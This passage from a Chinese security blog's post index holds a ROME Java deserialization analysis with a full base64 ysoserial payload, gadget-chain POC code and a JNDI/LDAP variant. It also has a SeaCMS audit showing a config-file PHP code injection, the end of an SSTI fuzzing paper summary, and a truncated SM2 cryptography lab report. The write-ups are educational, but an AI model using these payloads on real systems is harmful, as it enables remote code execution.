相应，无法识别二次注入；固定的 payload 字典无法自适应不同的注入点上下文语义环境\n 手动找 SSTI 注入（根据威胁模型）+ TEFuzz RCE\n\n\nTEFuzz 设计的性能评估\n测试基于种子和 interesting case 样例生成的有效性、聚合的能力以及错误修复能力\n\n评估测试样例自适应模块带来的有效性\n\n针对 EXP 合成模块的探究：\nexp失效的原因：\n\n模板解析错误。过度闭合转义点上下文语义，导致模板解析过程已经无法通过\n\n模板验证错误。标签解析后元素格式不符规定\n寻求模板解析验证和 EXP 合成之间的平衡（调整使其通过模板解析验证功能，不可避免地需要去知道模板语法是什么？？）\n一些思考：在中间语言层面去挖掘通用型。如果想即符合语法规范，又要能闭合逃逸点上下文，则需要更加复杂的构造（论文中提到高超的 hacking skills），不可避免得在模板的语法作研究，但是本文是绕过它的\n\n\n\n\n\n\n\n限制\n\n对于新的模板引擎，需要手动抽离分界符、编写驱动和测试样例适应规则，耗费人力\n无法检测种子语料库中未覆盖到的模板标签相关的漏洞\n未考虑到模板引擎当中的控制流/数据流限制\n\n\n一些思考\n种子语料库的覆盖问题。结合 DL 生成一些模板预料\nEXP 合成模块的结果无法通过模板解析过程问题。\n\n\n参考链接\n  [1]  https://www.usenix.org/conference/usenixsecurity23/presentation/zhaoyudi\n  [2] CVE-2021-26119 PHP Smarty \n  [3] https://blog.gm7.org/个人知识库/01.渗透测试/02.WEB漏洞/05.SSTI注入/\n  [4] https://smarty-php.github.io/smarty/4.x/\n  [5] https://www.anquanke.com/post/id/272393#h2-0\n\n\n","tags":["软件漏洞分析"]},{"title":"ROME反序列化浅析","url":"/2022/12/31/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"写在前面Java Rome 反序列化学习，学习系统化吸收知识点的，记录过程\n环境搭建\nmaven 依赖\n&lt;!-- https://mvnrepository.com/artifact/rome/rome --&gt;&lt;dependency&gt;    &lt;groupId&gt;rome&lt;/groupId&gt;    &lt;artifactId&gt;rome&lt;/artifactId&gt;    &lt;version&gt;1.0&lt;/version&gt;&lt;/dependency&gt;\n加载ysoserial payload 并 base64 编码\njava -jar ysoserial-all.jar ROME  &quot;calc.exe&quot; | base64 \n得到4438长度的payload\nrO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAacyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAdeXNvc2VyaWFsL1B3bmVyNDEzODAzNjI2NDk0MTQBAB9MeXNvc2VyaWFsL1B3bmVyNDEzODAzNjI2NDk0MTQ7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAXAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhzcgAoY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuRXF1YWxzQmVhbvWKGLvl9hgRAgACTAAKX2JlYW5DbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAEX29ianEAfgAJeHB2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwcQB+ABRzcgAqY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuVG9TdHJpbmdCZWFuCfWOSg8j7jECAAJMAApfYmVhbkNsYXNzcQB+ABxMAARfb2JqcQB+AAl4cHEAfgAfcQB+ABRzcQB+ABt2cQB+AAJxAH4ADXNxAH4AIHEAfgAjcQB+AA1xAH4ABnEAfgAGcQB+AAZ4\n\n测试 demo\npublic class Serialization &#123;    public static byte[] serialize(Object obj) throws Exception &#123;        ByteArrayOutputStream arr = new ByteArrayOutputStream();        try &#123;            ObjectOutputStream output = new ObjectOutputStream(arr);            output.writeObject(obj);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        return arr.toByteArray();    &#125;    public static Object unserialize(byte[] arr) throws Exception &#123;        Object obj = null;        try &#123;            ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(arr));            obj = input.readObject();        &#125;catch (Exception e) &#123;            e.printStackTrace();        &#125;        return obj;    &#125;    public static void test(Object obj) throws Exception &#123;        byte[] data = serialize(obj);        unserialize(data);    &#125;&#125;\npublic static void main(String[] args) throws Exception &#123;        String payload = &quot;xxx&quot;;        byte[] code = Base64.getDecoder().decode(payload);        Serialization.unserialize(code);    &#125;\n\n漏洞触发\n\n\n\n漏洞分析\n调用链如下\n* TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap&lt;K,V&gt;.hash(Object) * HashMap&lt;K,V&gt;.readObject(ObjectInputStream)\n\n调用链调试\n在HashMap#readObject()处下断点，根据以往的经验我们知道，这里会对HashMap中的key进行hash操作，注意参数类型这里是ObjectBean\n\n跟入hash函数自然的会调用key对象的hashCode操作\n\n在ObjectBean#hashCode()中，会进一步调用EqualsBean#beanHashCode()\n\n跟入又反过来调用了ObjectBean的toString方法\n\n进一步调用ToStringBean#toString()，这里会获得_obj属性的全限定类名并截取最后一个点号之后的类名作为prefix，并在最后再次调用重载的toString方法\n\n\n\n其中可以看到会先获取到_beanClass的JavaBean实例并遍历调用getter方法，筛选出声明类型不是Object类型的，且无参数的反射触发。这便与我们的Templates调用链TemplatesImpl.getOutputProperties()，其之后会进一步加载字节码并触发静态代码块\n\n利用链构造\nysoserial payload设计\n\n总体上分为四步：\n\nObjectBean的构造函数如下\n\nEqualsBean的构造函数如下\n\n其分别设置参数_beanClass 和 _obj，另外两个类也是类似\n\n\n接着我们带着参数理一遍调用链\n由于HashMap中的key为root参数，所以在调用key.hashCode时会去对应参数的方法\n\nthis._obj就是构造root的时的第二个参数delegate,因此触发ObjectBean.toString\n这里的_toStringBean我们构造ToStringBean类 _beanClass为Templates.class和进一步封装的恶意Templates实例\n\n第一个调用的是ToStringBean类的无参toString方法，这里的_obj是delegate参数对应的恶意Templates实例\n\n进一步调用有参toString方法，这里的_beanClass注意是javax.xml.transform.Templates类接口，后续前面已经说过\n\n\n调用链缩短先根据yso的逻辑实现自己实现一个\nObject o = Gadgets.createTemplatesImpl(&quot;calc.exe&quot;);Object delegate = new ObjectBean(Templates.class, o);ObjectBean root = new ObjectBean(String.class, &quot;1&quot;);HashMap map = new HashMap();map.put(root, &quot;1&quot;);Field field = ObjectBean.class.getDeclaredField(&quot;_equalsBean&quot;);field.setAccessible(true);field.set(root, new EqualsBean(ObjectBean.class, delegate));byte[] serialize = serialize(map);unserialize(serialize);\n\n改造的思路主要是替换调用链当中一些处理麻烦的类方法\n首先EqualsBean类中的equals方法可以看到最终也可以通过调用beanEquals方法，最终触发到Templates的getter方法，问题点就在如何触发到equals方法\n\n这里需要先了解一下HashMap的hashCode方法，其会根据类型调用对应的hashCode\n\n如果传入的是字符串，那么hashCode方法如下\n\n对于两个元素得到等式\n\n31val[0]+val[1]=31val[0]+val[1]\n第一个元素如果比第二个元素小1，第二个元素就必须比第一个元素大31\n\n因此对于字符串aa和bB来说，两者的hashCode是相同的。另一个关于hashMap的细节在于如果其中的元素大于1个，则在hashCode运算时会先调用父类的hashCode，也就是\nAbstractMap#hashCode()\n\n所以这里如果我们这样设置，那么两者是相等的\nmap1.put(&quot;aa&quot;, &quot;1&quot;);map1.put(&quot;bB&quot;, &quot;2&quot;);map2.put(&quot;aa&quot;, &quot;2&quot;);map2.put(&quot;bB&quot;, &quot;1&quot;);\n我们代入这个知识点再去看反序列化调用过程中的HashMap#putval(key)方法，其中当两个key哈希相同时，会触发equals方法，这里我们让它触发map的equals方法\n\n进一步，如果map中元素大于1个，则会调用到父类AbstractMap的equals方法，里面会触发value的equals方法，因此我们只需要将value设置成对应的EqualsBean实例即可\n\n\n这里如此设置的原因一个是我们需要调用到EqualsBean对象，所以设置成value。然后让另一个map相同的key对应value设置为templates实例，主要是在后面会有是否是实例的判断\nmap1.put(&quot;aa&quot;, templates);map1.put(&quot;bB&quot;, bean);map2.put(&quot;aa&quot;, bean);map2.put(&quot;bB&quot;, templates);\n\nPOC：\nObject templates = Gadgets.createTemplatesImpl(&quot;calc.exe&quot;);      EqualsBean bean = new EqualsBean(String.class, &quot;&quot;);      HashMap map1 = new HashMap();      HashMap map2 = new HashMap();      map1.put(&quot;aa&quot;, templates);      map1.put(&quot;bB&quot;, bean);      map2.put(&quot;aa&quot;, bean);      map2.put(&quot;bB&quot;, templates);      HashMap map = new HashMap();      map.put(map1, &quot;&quot;);      map.put(map2, &quot;&quot;);      setFieldValue(bean, &quot;_beanClass&quot;, Templates.class);      setFieldValue(bean, &quot;_obj&quot;, templates);      byte[] serialize = serialize(map);      System.out.println(Base64.getEncoder().encode(serialize).length);      unserialize(serialize);\n此时长度为\n\n我们下一步需要改进的是yso的Gadgets.createTemplatesImpl(&quot;calc.exe&quot;)\n这里主要就是利用到javassist直接操作class对象（找时间再补一下javassist基础），可以非常简洁的构造一个恶意class对象\npublic static byte[] generate() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clazz = pool.makeClass(&quot;evil&quot;);        CtClass superClass = pool.get(AbstractTranslet.class.getName());        clazz.setSuperclass(superClass);        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz);        constructor.setBody(&quot;Runtime.getRuntime.exec(\\&quot;calc.exe\\&quot;);&quot;);        clazz.addConstructor(constructor);        return clazz.toBytecode();    &#125;\n最后再设置一下Templates实例对象各个属性即可\npublic static TemplatesImpl getTemplatesImpl() throws Exception &#123;        byte[][] bytes = &#123;generate()&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, bytes);        setFieldValue(templates, &quot;_name&quot;, &quot;1&quot;);        setFieldValue(templates, &quot;_tfactory&quot;, null);        return templates;    &#125;\n最后长度\n\n其他新利用链更换sinks\n这里我们也可以不利用加载恶意字节码的方式，改换成JNDI注入的方式。将sinks函数更换为JdbcRowSetImpl.getDatabaseMetaData()\npublic static void main(String[] args) throws Exception &#123;        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        jdbcRowSet.setDataSourceName(&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;);        jdbcRowSet.setMatchColumn(new String[]&#123;&quot;a&quot;&#125;);        EqualsBean bean = new EqualsBean(String.class, &quot;&quot;);        HashMap map1 = new HashMap();        HashMap map2 = new HashMap();        map1.put(&quot;aa&quot;, jdbcRowSet);        map1.put(&quot;bB&quot;, bean);        map2.put(&quot;aa&quot;, bean);        map2.put(&quot;bB&quot;, jdbcRowSet);        HashMap map = new HashMap();        map.put(map1, &quot;&quot;);        map.put(map2, &quot;&quot;);        setFieldValue(bean, &quot;_beanClass&quot;, JdbcRowSetImpl.class);        setFieldValue(bean, &quot;_obj&quot;, jdbcRowSet);        byte[] serialize = serialize(map);        System.out.println(Base64.getEncoder().encode(serialize).length);        unserialize(serialize);    &#125;\n这里的长度目前超过了2000，如果想要缩减长度的话，就需要剔除JdbcRowSetImpl实例中无用的属性，但又不能影响到最终JNDI注入的执行\n\npublic static void clear(JdbcRowSetImpl jdbcRowSet) throws Exception &#123;        setFieldValue(jdbcRowSet, &quot;iMatchColumns&quot;, null);        setFieldValue(jdbcRowSet, &quot;resBundle&quot;, null);        // private Vector&lt;RowSetListener&gt; listeners;        Class&lt;?&gt; clazz = Class.forName(BaseRowSet.class.getName());        Field field = clazz.getDeclaredField(&quot;listeners&quot;);        field.setAccessible(true);        field.set(jdbcRowSet, null);        // private Hashtable&lt;Integer, Object&gt; params;        Field field1 = clazz.getDeclaredField(&quot;params&quot;);        field1.setAccessible(true);        field1.set(jdbcRowSet, null);    &#125;\n最终payload长度\n\n二次反序列化的方式：\n我们已经知道EqualsBean/ToStringBean类最终可以触发到某个类的getter方法，那么一个思路就是继续触发getter方法中的原生反序列化方法，且内容可控\njava.security.SignedObject非常符合要求\n\n看看参数是怎么流动的，在构造方法中，会将第一个参数进行序列化并以字节数组的方式存入content属性当中\n\n但感觉这样肯定更复杂了，试了一下确实是，就不展开了\n参考链接https://exp10it.cn/2022/11/rome-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/\nhttps://124.221.153.250/archives/721#ysoserial%E6%BA%90%E7%A0%81\nhttps://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90\nhttps://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/\n","tags":["JAVA安全"]},{"title":"跟着Y4师傅学代码审计-SeaCMS","url":"/2022/12/13/SEACMS%E5%88%86%E6%9E%90/","content":"写在前面这篇是代码审计练习的第六篇，最近压力稍减，逐渐转移到项目和挖洞上了。项目方向逐渐清晰了，只不过自己心态上还是有些急，你先别急。\n环境搭建这个后台地址看起来像是随机的\n\n漏洞分析漏洞点位于后台系统中的图片水印设置\n\n定位路由至/p7pxx0/admin_config_mark.php?dopost=save我们先正常走一遍流程。其中可以发现存在两个WAF。第一个是在包含文件内，首先会包含一个config.php\n\n紧接着包含common.php，跟进\n\n其中会调用addslashes()检查参数中特殊字符并转义\n\n\n这里留个心眼，往后看。回到主文件，检查提交的各个参数，如果其中有引号的话会进行去空操作，也就是说如果参数中包含引号，会先被转义再被去空，剩下个反斜杠将会作用到下一个字符，这势必会有隐患。\n\n接着往下看，这里就是将提交的参数写入到ImageWaterConfigFile变量对应的文件中\n\n查看文件可以看到键值排列，值全部引号包含，键值对之间以\\r\\n分隔\n\n最后再把这个文件包含进来\n\n那么我们利用的话可以通过加一个引号来导致转义掉原本用于闭合值的引号，以$photo_waterext一行为例\n$photo_waterext = &#x27;\\&#x27;;\n这样下面的语句将会变成引号内的句子，我们可以通过;phpinfo();来闭合前面的语句并加入恶意代码\n$photo_fontsize = &#x27;\\&#x27;;$photo_fontcolor = &#x27;;phpinfo();&#x27;;\n后面再配合一个分号即可\n\n最后保存的结果如下\n\n语句没报错，可被成功利用\n后面就不继续看了，最新版本基本上WAF覆盖的很全了，会有防御过渡的情况，如上所示\n","tags":["代码审计"]},{"title":"SM2国密算法实现","url":"/2022/12/07/SM2%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/","content":"写在前面这次是最后一次密码学实验，实现SM2国密算法。基本上参考的都是官方文档上的说明，一切以官方文档为主。我贴一下实验报告\n实验目的（包括实验环境、实现目标等等）实现目标：SM2国密公钥算法实现\n实验环境：Windows 10、Python 3.9.1、VScode\n方案设计背景及原理：\n\n 有限域乘法群上离散对数问题，目前最好的求解算法称为指标计算法，是亚指数时间算法。就现在的计算能力，1024比特规模阶数的有限域可以达到一定的安全性。人们试图寻找一个群，使得其上的离散对数问题没有亚指数算法。椭圆曲线加法群是非常好的候选对象。\n\n1. 素域Fp的定义\n \n2.Fp上的椭圆曲线\n仿射坐标表示：\n \n \n \n射影坐标表示：\n \n加重射影坐标表示：\n \n3. 二元扩域\n \n4.二元扩域下的椭圆曲线\n仿射坐标表示：\n \n射影坐标表示：\n \n \n加重射影坐标表示：\n \n算法步骤：\n1. 加密步骤：\n \n2. 解密步骤：\n \n \n方案实现算法流程图：\n加密流程\n \n解密流程\n \n参数说明：\n首先说明我这里域的选择主要是大素数域而非二次扩域，其他参数均为SM2椭圆曲线公钥算法的推荐参数，因此其中有一步骤的余因子可以直接指定为1，在检验时省去了倍点运算的一步操作，相关参数如下所示：\n \n中间设计数据类型和形式上的转换：\n \n首先在这儿其中最重要的就是各种数据类型的转换，我结合了文档上针对每种类型转换的描述以及Python语言本身提供的一些特性函数，针对转换做出了实现：\n对于整数到字节串的转换，我这里用了两种方式：\n\nbytes([&lt;integer&gt;])\n\nbytes.fromhex(&lt;hex format string&gt;)\n\n\n对于字节串转换成整数，我只要先将字节串转换成十六进制的形式，然后利用int函数\nint(binascii.hexlify(&lt;byte string&gt;), 16)\n对于比特串到字节串我这里并没有特别进行实现，因为在所有函数当中需要使用比特串的时候，也对应有直接用字节串的实现方式，只有在特别需要比特串某一位时，我用bin函数来使用。\n域元素与整数间的相互转换由于我选择的是大素数域，因此两者一致\n对于点到字节串的转换，严格按照下图所示：\n \n 实现代码如下：\ndef _byte_to_point(self, C, mode):        l = math.ceil(gmpy2.log2(int(self.ecc_param[&#x27;p&#x27;], 16))/8)        l = int(l)        PC = binascii.hexlify(bytes([C[0]]))        # print(binascii.hexlify(C))        xp = int(binascii.hexlify(C[1:l+1]), 16)        # print(binascii.hexlify(xp))        # print(&quot;PC: &quot;, PC)        if mode == 1:            if PC != b&quot;02&quot; or PC != b&quot;03&quot;:                print(&quot;[+] Something Error during decrypting...&quot;)                exit(-1)            else:                if PC == b&quot;02&quot;:                    yp = &#x27;0&#x27;                else:                    yp = &#x27;1&#x27;            alpha = (pow(xp, 3) + int(self.ecc_param[&#x27;a&#x27;], 16)*xp + int(                self.ecc_param[&#x27;b&#x27;], 16)) % int(self.ecc_param[&#x27;p&#x27;], 16)            beta, has_root = gmpy2.iroot(alpha, int(self.ecc_param[&#x27;p&#x27;], 16))            if has_root:                if yp == bin(beta)[-1]:                    yp = beta                else:                    yp = int(self.ecc_param[&#x27;p&#x27;], 16) - beta            else:                print(&quot;[+] Something Error during decrypting...&quot;)        elif mode == 2:            if PC != b&quot;04&quot;:                print(&quot;[+] Something Error during decrypting...&quot;)                exit            else:                yp = int(binascii.hexlify(C[l+1:2*l+1]), 16)        else:            if PC != b&quot;06&quot; or PC != b&quot;07&quot;:                print(&quot;[+] Something Error during decrypting...&quot;)                exit(-1)            else:                yp = int(binascii.hexlify(C[l+1:2*l+1]), 16)        # verify xp and yp        if gmpy2.powmod(yp, 2, int(self.ecc_param[&#x27;p&#x27;], 16)) == ((gmpy2.powmod(xp, 3, int(self.ecc_param[&#x27;p&#x27;], 16)) + int(self.ecc_param[&#x27;a&#x27;], 16)*xp + int(self.ecc_param[&#x27;b&#x27;], 16)) % int(self.ecc_param[&#x27;p&#x27;], 16)):            return (xp, yp)        else:            print(&quot;[+] Something Error during decrypting...&quot;)            exit(-1)\n对于字节串到点的转换，也按如下步骤实现：\n \n代码实现如下：\ndef point_to_byte(self, P, mode):        PC = None        # 域元素xP转换成长度为l的字节串X1        X1 = self._field_to_byte(P[0])        # 1.压缩 2.未压缩 3.混合        if mode == 1:            print(&#x27;[+] representation: compressed&#x27;)            # 计算比特y˜P            yp = bin(P[1])[-1]            if yp == &#x27;0&#x27;:                PC = &#x27;02&#x27;            else:                PC = &#x27;03&#x27;            return PC + X1        elif mode == 2:            print(&#x27;[+] representation: uncompressed&#x27;)            Y1 = self._field_to_byte(P[1])            PC = &#x27;04&#x27;            return PC + X1 + Y1        else:            print(&#x27;[+] representation: mixed&#x27;)            Y1 = self._field_to_byte(P[1])            yp = bin(P[1])[-1]            if yp == &#x27;0&#x27;:                PC = &#x27;06&#x27;            else:                PC = &#x27;07&#x27;            return PC + X1 + Y1\n运算规则部分实现：\n\n加法规则\n\n \n里面针对 $\\lambda$ 的除法，我转换成了乘以模拟的操作。\ndef _add_point(self, P1, P2):        p = int(self.ecc_param[&#x27;p&#x27;], 16)        P1_x, P1_y = P1[0], P1[1]        P2_x, P2_y = P2[0], P2[1]        if P1_x == 0 and P1_y == 0 and P2_x == 0 and P2_y == 0:            return 0, 0        if P1_x == P2_x and P1_y == P2_y:            lbd = (3*pow(P1_x, 2) +                   int(self.ecc_param[&#x27;a&#x27;], 16))*gmpy2.invert((2*P1_y), p) % p        else:            if (P1 == (0, 0)) or (P2 == (0, 0)):                return P1 if P1 != (0, 0) else P2            lbd = (P2_y-P1_y)*gmpy2.invert(P2_x-P1_x, p) % p        P3_x = (pow(lbd, 2) - P1_x - P2_x) % p        P3_y = (lbd*(P1_x - P3_x) - P1_y) % p        return P3_x, P3_y\n\n倍点运算规则\n\n倍点运算我这里利用二进制展开法进行的实现\n \n \ndef _mutiply_p(self, multi, P):        product = (0, 0)        for i in bin(multi):            product = self._add_point(product, product)            if i == &#x27;1&#x27;:                product = self._add_point(product, P)        return product\n密钥派生部分\n \n代码实现如下，其中需要注意的是klen长度是比特长度，而我们的类型中还包括整数的长度、字节长度，这里传参时要进行相应的转换：\n def _KDF(self, bit_string, klen):        klen = int(klen)        ct = 0x00000001        rcnt = math.ceil(klen/32)        zin = [i for i in bytes.fromhex(bit_string.decode())]        ha = &quot;&quot;        for i in range(rcnt):            msg = zin + \\                [i for i in binascii.a2b_hex((&#x27;%08x&#x27; % ct).encode())]            ha = ha + sm3.sm3_hash(msg)            ct += 1        return ha[0: klen * 2]\n最终汇总起来，按照加密流程实现加密函数：\ndef encrypt(self, M, mode):        k = randint(1, int(self.ecc_param[&#x27;n&#x27;], 16)-1)        public_key = self.public_key        print(&#x27;[+] random number k:&#x27;, k)        # 实际上是随机值        # k = int(&#x27;4C62EEFD6ECFC2B95B92FD6C3D9575148AFA17425546D49018E5388D49DD7B4F&#x27;, 16)        l = len(self.ecc_param[&#x27;n&#x27;])        g = (int(self.ecc_param[&#x27;g&#x27;][0: l], 16),             int(self.ecc_param[&#x27;g&#x27;][l:], 16))        result = self._mutiply_p(k, g)        # mode = 2    需要用户传参提供        C1 = self.point_to_byte(result, mode)        xy = self._mutiply_p(k, public_key)        klen = len(M)*4  # 十六进制下        # 比特长度        result = self._KDF(            (hex(xy[0])[2:]+hex(xy[1])[2:]).encode(), klen/8)        if int(result, 16) == 0:            return None        else:            # M = &#x27;656E6372797074696F6E207374616E64617264&#x27;            C2 = hex(int(M, 16) ^ int(result, 16))[2:]        C3 = sm3.sm3_hash([            i for i in bytes.fromhex(&#x27;%s%s%s&#x27; % (hex(xy[0])[2:], M, hex(xy[1])[2:]))        ])        return bytes.fromhex(&#x27;%s%s%s&#x27; % (C1, C2, C3))\n按照解密流程实现解密函数：\ndef decrypt(self, C, mode):        &quot;&quot;&quot;        mode:            1. 压缩 2. 未压缩 3. 混合        &quot;&quot;&quot;        l = math.ceil(gmpy2.log2(int(self.ecc_param[&#x27;p&#x27;], 16))/8)        l = int(l)        # 字节长度        lengthOfS = 0        if mode == 1:            lengthOfS = l+1        else:            lengthOfS = 2*l+1        # C2比特长度        klen = (len(C) - lengthOfS - 32)        C2 = int(binascii.hexlify(C[lengthOfS:lengthOfS+klen]), 16)        C3 = C[lengthOfS+klen:]        C1 = C[0:lengthOfS]        C1 = self._byte_to_point(C1, mode)        C1 = self._mutiply_p(self.private_key, C1)        bytestring = bytes.fromhex(&#x27;%s%s&#x27; % 